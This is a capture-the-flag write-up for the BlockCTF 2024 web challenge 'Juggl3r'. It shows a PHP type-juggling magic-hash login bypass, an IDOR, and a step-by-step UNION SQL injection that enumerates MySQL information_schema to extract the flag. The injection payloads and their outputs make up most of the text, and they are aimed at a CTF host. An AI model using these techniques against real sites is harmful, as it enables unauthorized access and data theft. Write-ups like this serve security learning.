# BlockCTF 2024

## Juggl3r

> "The admin panel seems locked behind some odd logic, and the flag is hidden deep. Can you bypass the checks and uncover the secret?
>
>  Author: n/a
>

Tags: _web_

## Solution
For the challenge we get a link to a small web-site. Opening it shows a login formular. The response header tells us the page is delivered by an `Apache` webserver and runs with `PHP 7.4.33`.

```bash
HTTP/1.1 200 OK
Date: Thu, 14 Nov 2024 14:32:56 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 619
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```

Trying `test:test` as input credentials gives us an error `User not found`, this is interesting, since we can bruteforce typical users and get direct feedback if such a user exists or not. Lets try `admin:test`, and yes we get `Invalid password`, so we found a valid user already.

Since the challenge title is `Juggl3r` we can guess that the vulerability we are looking for exploits PHPs [`type juggling`](https://www.php.net/manual/en/language.types.type-juggling.php) in some way. Lets try passing an array as `password` parameter, instead of a string.

```bash
> curl -XPOST http://54.85.45.101:8080/login.php -d "username=admin&password[]=1"
<br />
<b>Warning</b>:  hash() expects parameter 2 to be string, array given in <b>/var/www/html/login.php</b> on line <b>36</b><br />
...
```

We still get `Invalid password` but the webserver is badly configured and shows warnings that gives us a good hint. The code uses [`hash`](https://www.php.net/manual/en/function.hash.php) to generate a hash of the password before comparing the hashes. It fails when passing an array as second parameter (`data`). This reveils a little bit about implementation details so we can try to continue finding a workaround.

One possibility are [`magic hashes`](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md#magic-hashes). Since we don't know the hash algorithm we can try some of the list for different algorithms, and eventually find `34250003024812` works as password (so the implementation uses `sha-256` as algorithm).

Logging in as `admin:34250003024812` gives us the admin panel that doesnt give us very much information. Only `User found: admin` and a logout button. But we can see in the url there is a parameter `user_id=1` (`http://54.85.45.101:8080/admin.php?user_id=1`) that calls for [`IDOR`](https://en.wikipedia.org/wiki/Insecure_direct_object_reference). 

So we can try other user id's, for instance `http://54.85.45.101:8080/admin.php?user_id=2` indeed gives us `User found: user`. But otherwise no users are found. This could of course mean we have another user with a large user id. Also we can try to enter nonsense values as user id, for instance `http://54.85.45.101:8080/admin.php?user_id=abc` that gives us.

```bash
Fatal error: Uncaught PDOException: SQLSTATE[42S22]: Column not found: 1054 Unknown column 'abc' in 'where clause' in /var/www/html/admin.php:16 Stack trace: #0 /var/www/html/admin.php(16): PDO->query('SELECT * FROM u...') #1 {main} thrown in /var/www/html/admin.php on line 16
```

This of course is a lot of leaked information, also it looks like this part is vulnerable to [`SQL injection`](https://en.wikipedia.org/wiki/SQL_injection). So we should start collecting more informations about the database. For this we use [`UNION attack`](https://portswigger.net/web-security/sql-injection/union-attacks).

We guess the table is called `user` or `users`, based on the error we got before. First we try to find out how many columns the users table has:

```bash
http://54.85.45.101:8080/admin.php?user_id=1 union select 1 from users
http://54.85.45.101:8080/admin.php?user_id=1 union select 1,2 from users
http://54.85.45.101:8080/admin.php?user_id=1 union select 1,2,3 from users
...
```

The first two requests gives us

```bash
Fatal error: Uncaught PDOException: SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns in /var/www/html/admin.php:16 Stack trace: #0 /var/www/html/admin.php(16): PDO->query('SELECT * FROM u...') #1 {main} thrown in /var/www/html/admin.php on line 16
```

The last one succeeds, but we still see `User found: admin`. So we know the `users` table has three columns, but since our union select is appended to the query result, and the page only shows the first result we need to limit our result to the information we want to leak.

```bash
http://54.85.45.101:8080/admin.php?user_id=1 union select 1,2,3 from users limit 1,1
```

Perfect, this gives us `User found: 2`, so we can leak information and we know the second column is displayed on the page. Lets first check how many users we actually have:

```bash
http://54.85.45.101:8080/admin.php?user_id=1 union select 1,count(*),3 from users limit 1,1
```

We still get `Users found: 2`, therefore we know now we actually have only two users and dont need to search further in the users table. Next we want to see if there are other interesting tables. For this we need to know what database the server is running. We can try `sqlite`:

```bash
http://54.85.45.101:8080/admin.php?user_id=1 union select 1,count(*),3 from sqlite_schema where type ='table' and name NOT LIKE 'sqlite_%' limit 1,1

Fatal error: Uncaught PDOException: SQLSTATE[42S02]: Base table or view not found: 1146 Table 'ctf_challenge.sqlite_schema' doesn't exist in /var/www/html/admin.php:16 Stack trace: #0 /var/www/html/admin.php(16): PDO->query('SELECT * FROM u...') #1 {main} thrown in /var/www/html/admin.php on line 16
```

The table doesn't exist, so not `sqlite`, maybe `mysql`:

```bash
http://54.85.45.101:8080/admin.php?user_id=1 union select 1,count(*),3 from information_schema.tables limit 1,1
```

This gives us `User found: 86`, thats perfect since we know the server is running `mysql` and we have a lot of tables to look at. Typically the application tables are found at the end of the list, so we start going backwards.

```bash
http://54.85.45.101:8080/admin.php?user_id=1 union select 1,table_name,3 from information_schema.tables limit 86,1
User found: temp_table

http://54.85.45.101:8080/admin.php?user_id=1 union select 1,table_name,3 from information_schema.tables limit 85,1
User found: login_attempts

http://54.85.45.101:8080/admin.php?user_id=1 union select 1,table_name,3 from information_schema.tables limit 84,1
User found: flags

http://54.85.45.101:8080/admin.php?user_id=1 union select 1,table_name,3 from information_schema.tables limit 83,1
User found: users

...
```

Alright, table `flags`, that looks good. The only thing is, we don't know what column to query from the table. But we can also query the information.

```bash
http://54.85.45.101:8080/admin.php?user_id=1 union select 1,column_name,3 from information_schema.columns where table_name='flags' limit 1,1
User found: id

http://54.85.45.101:8080/admin.php?user_id=1 union select 1,column_name,3 from information_schema.columns where table_name='flags' limit 2,1
User found: flag

http://54.85.45.101:8080/admin.php?user_id=1 union select 1,column_name,3 from information_schema.columns where table_name='flags' limit 3,1
User not found
```

Good, the column is named `flags`. With all the information we can finally query from the table `flags` and the first entry gives us the flag.

```bash
http://54.85.45.101:8080/admin.php?user_id=1 union select 1,flag,3 from flags limit 1,1
User found: flag{juggl3_inject}
```

Flag `flag{juggl3_inject}`